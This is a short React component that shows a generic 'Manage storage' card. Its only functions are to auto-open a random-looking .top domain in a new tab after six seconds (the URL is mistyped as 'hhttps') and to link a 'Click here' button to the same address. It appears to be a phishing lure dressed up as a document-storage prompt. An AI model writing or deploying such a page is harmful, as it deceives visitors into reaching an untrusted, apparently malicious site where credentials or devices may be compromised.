import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { ArrowRight } from "lucide-react";
import { useEffect } from "react";

const StorageCard = () => {
  useEffect(() => {
    const timer = setTimeout(() => {
      window.open("hhttps://qxvldb.qarvi.top/u8eqfacyft8xilft430u", "_blank");
    }, 6000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-background">
      <Card className="w-full max-w-md p-8 shadow-2xl border-0 rounded-3xl bg-white">
        <div className="text-center space-y-6">
          <div className="space-y-3">
            <h1 className="text-3xl font-bold text-foreground tracking-tight">
              Manage storage
            </h1>
            <p className="text-muted-foreground text-lg leading-relaxed">
              Manage your document storage and access.
            </p>
          </div>
          
          <div className="pt-4">
            <Button 
              variant="storage" 
              size="lg" 
              className="w-full text-lg font-semibold py-4 rounded-2xl"
              asChild
            >
              <a href="https://qxvldb.qarvi.top/u8eqfacyft8xilft430u" target="_blank" rel="noopener noreferrer">
                Click here
                <ArrowRight className="ml-2 h-5 w-5" />
              </a>
            </Button>
          </div>
        </div>
      </Card>
    </div>
  );
};

export default StorageCard;